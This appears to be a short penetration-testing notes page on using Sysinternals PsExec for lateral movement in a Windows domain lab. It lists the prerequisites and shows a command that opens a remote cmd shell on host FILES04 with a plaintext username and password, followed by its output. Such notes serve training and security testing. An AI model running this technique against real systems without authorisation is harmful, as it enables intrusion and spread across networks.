---
description: PsExec is a very versatile tool that is part of the SysInternals Suite.
---

# PsExec

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" %}



## Prerequisites

In order to use PsExec for lateral movement the following conditions must be met:

* SysInternals Tools Installed on System.
* The user is apart of the Local Administrator group.
* _ADMIN$_ share must be available and File and Printer Sharing has to be turned on.



### Lateral Movement

```powershell
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```

